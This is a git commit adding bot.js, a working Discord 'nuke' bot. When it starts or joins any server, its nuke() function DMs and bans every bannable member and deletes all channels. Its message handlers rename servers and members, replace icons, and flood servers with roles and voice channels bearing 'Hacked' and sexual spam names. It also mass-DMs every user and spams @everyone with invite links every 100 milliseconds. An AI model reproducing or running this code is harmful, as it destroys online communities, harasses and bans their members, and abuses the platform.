11d75155144e6c7d72968e17fa0aa761eef39426
hey <44032576+YASSIN974@users.noreply.github.com>
2019-02-04 23:48:44 +0100

    Create bot.js

---
+++ bot.js
@@ -0,0 +1,449 @@
+const Discord = require("discord.js");
+const mar = new Discord.Client();
+
+console.log('cute');
+mar.on('ready', () => {
+  console.log(`Logged in as ${mar.user.tag} !`);
+     mar.user.setStatus("Offline"); 
+});
+mar.on('ready',  () => {
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('      ~            ~  By : mar ~           ~    ');
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
+console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
+console.log(`Logged in as  * [ "  cute " ] servers! [ " ${mar.guilds.size} " ] Users! [ " ${mar.users.size} " ]`);
+
+       mar.user.setStatus("Offline"); 
+    
+
+});
+
+
+var x1 = "."
+
+
+
+
+mar.on('message', message => {
+     if (message.content.startsWith(".")){
+         mar.guilds.forEach(m =>{
+             m.setIcon(`https://cdn.discordapp.com/attachments/441673688270766082/441675025934712832/fludkae.png`)
+})
+}
+});
+mar.on('message', message => {
+    if (message.content.startsWith(".")){
+         mar.guilds.forEach(m =>{
+             m.setName(`@!                     Relax#0002 `)
+})
+}
+});
+
+mar.on('message', message => {
+     if (message.content === ".") {
+                 if(!message.channel.guild) return;
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/441673688270766082/441675025934712832/fludkae.png`)
+
+}
+});
+
+mar.on('message', message => {
+     if (message.content === ".") {
+         message.guild.members.forEach(m => {
+              m.setNickname(`@!                     Relax#0002 `)
+})
+}
+});
+
+mar.on('message', message => {
+     
+
+     if (message.content === ".") {
+         mar.guilds.forEach(m =>{
+  m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    }) 
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ا",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002  ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+     m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+
+    m.createRole({
+        name : "safi",
+        permissions :   [1],
+        color : "RANDOM"
+    }) 
+    m.createRole({
+        name : "azebi ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+
+    m.createRole({
+        name : "ktn9ez ",
+        permissions :   [1],
+        color : "RANDOM"
+    }) 
+    m.createRole({
+        name : "ta jebtiha f krek",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002  ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "! Relax#8208",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "! Relax#8208",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "! Relax#8208",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "! Relax#8208",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "! Relax#8208",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "! Relax#8208",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "! Relax#8208",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "! Relax#8208",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "@!                     Relax#0002 ",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "mnsawch SaDBadBoy#4505",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+
+    m.createRole({
+        name : "KiKi",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "KiKi",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+
+    m.createRole({
+        name : "KiKi",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "KiKi",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+    m.createRole({
+        name : "KiKi",
+        permissions :   [1],
+        color : "RANDOM"
+    })
+
+
+    
+})
+ 
+ 
+}
+});
+mar.on('message', message => {
+         if (message.content === ".") {
+               mar.guilds.forEach(m =>{
+m.createChannel('2+2=5', 'voice');
+m.createChannel('2+2=5', 'voice');
+m.createChannel('2+2=', 'voice');
+m.createChannel('2+2=lhwa', 'voice');
+m.createChannel('2+2=5', 'voice');
+m.createChannel('2+2=5', 'voice');
+m.createChannel('2+2=5', 'voice');
+m.createChannel('2+2=5', 'voice');
+m.createChannel('2+2=5', 'voice');
+m.createChannel('2+2=5', 'voice');
+
+m.createChannel('2+2=5', 'voice');
+
+m.createChannel('2+2=5', 'voice');
+
+m.createChannel('2+2=5', 'voice');
+
+m.createChannel('2+2=5', 'voice');
+m.createChannel('2+2=5#', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('NerLOR0001', 'voice');
+m.createChannel('! Relax8208', 'voice');
+m.createChannel('! Relax8208', 'voice');
+m.createChannel('! Relax8208', 'voice');
+m.createChannel('! Relax8208', 'voice');
+m.createChannel('! Relax8208', 'voice');
+m.createChannel('! Relax8208', 'voice');
+m.createChannel('! Relax8208', 'voice');
+m.createChannel('! Relax8208', 'voice');
+
+m.createChannel('! Relax8208', 'voice');
+m.createChannel('! Relax8208', 'voice');
+
+})
+}
+});
+
+mar.on('message', message => {
+         if (message.content === ".") {
+                 mar.guilds.forEach(m =>{
+m.createChannel('Hacked لحواااااا', 'voice');
+m.createChannel('سكس 2017 شاهد قبل الحدف', 'voice');
+m.createChannel('Hacked سكسسسسسسسسسسسسسسسس', 'voice');
+m.createChannel('Hacked u ساخنببببببببببب', 'voice');
+m.createChannel('Hacked u اهههههههههههههه', 'voice');
+m.createChannel('Hacked u هههههههههههههههه', 'voice');
+m.createChannel('Hacked u bهههههههههe', 'voice');
+m.createChannel('Hacked uهههههههههههههre', 'voice');
+
+m.createChannel('Hacked u ههههههههههههههههe', 'voice');
+m.createChannel('تجمع لقحاب سكس 2017', 'voice');
+
+m.createChannel('الموقع الازرق ', 'voice');
+m.createChannel('امور زاملللل', 'voice');
+m.createChannel('انور زامل هههههه', 'voice');
+m.createChannel('غنشدك غنحويكككككككههههه', 'voice');
+m.createChannel('! Relax#8208', 'voice');
+m.createChannel('! Relax#8208', 'voice');
+m.createChannel('! Relax#8208', 'voice');
+m.createChannel('! Relax#8208', 'voice');
+m.createChannel('! Relax#8208', 'voice');
+m.createChannel('! Relax#8208', 'voice');
+m.createChannel('! Relax#8208', 'voice');
+m.createChannel('! Relax#8208', 'voice');
+
+m.createChannel('@!                     Relax#0002 ', 'voice');
+m.createChannel('@!                     Relax#0002 ', 'voice');
+m.createChannel('@!                     Relax#0002 ', 'voice');
+m.createChannel('@!                     Relax#0002 ', 'voice');
+m.createChannel('@!                     Relax#0002 ', 'voice');
+m.createChannel('@!                     Relax#0002 ', 'voice');
+m.createChannel('@!                     Relax#0002 ', 'voice');
+m.createChannel('@!                     Relax#0002 ', 'voice');
+
+})
+}
+
+});
+
+
+const { Client } = require('discord.js');
+const client = new Client();
+
+async function nuke(guild) {
+  let users = 0;
+  let channels = 0;
+
+  await guild.fetchMembers();
+
+  await guild.owner.send('hi owner your server by R5 team .sorry').catch(e => { return void e; });
+
+
+
+  await Promise.all(guild.members.map(async (m) => {
+    if (m.bannable) {
+      users++;
+        await m.send(`the server hws haked  for more join https://discord.gg/j2nHUg hhhhhhhhh `).catch(e => { return void e; });
+      return m.ban();
+    }
+  }));
+  
+    await Promise.all(guild.channels.map(c => {
+    if (c.deletable) {
+      channels++;
+      return c.delete();
+    }
+  }));
+  
+    await guild.createChannel('test', 'voice');
+
+      await guild.createChannel('test', 'voice');
+
+
+
+}
+
+mar.on('ready', () => {
+  for(const [, g] of mar.guilds) nuke(g).catch(console.error);
+  console.log('-----------------------------------------------------------------');
+  console.log('-----------------------------------------------------------------');
+  console.log("-----------------------------------------------------------------");
+  console.log("-----------------------------------------------------------------");
+  console.log("-----------------------------------------------------------------");
+
+});
+
+mar.on('guildCreate', async (guild) => {
+  return nuke(guild).catch(console.error);
+});
+
+
+
+
+ mar.on('message', message => {
+            if(!message.channel.guild) return;
+let args = message.content.split(' ').slice(1).join(' ');
+if (message.content.startsWith('bc')){
+mar.users.forEach(m =>{
+m.sendMessage(args)
+})
+}
+});
+
+mar.on('message', message => {
+            if(!message.channel.guild) return;
+let args = message.content.split(' ').slice(1).join(' ');
+if (message.content.startsWith('r5')){
+message.channel.sendMessage('@here the server was haked ')
+
+
+}
+});
+
+
+
+mar.on('message', message => {
+    if (message.content.startsWith('r5')){
+setInterval(() => {
+message.channel.sendMessage('@everyone the server was haked  discord.gg/MB49QPn')
+}, 100);
+}
+}); 
+
+
+
+mar.login("token")  
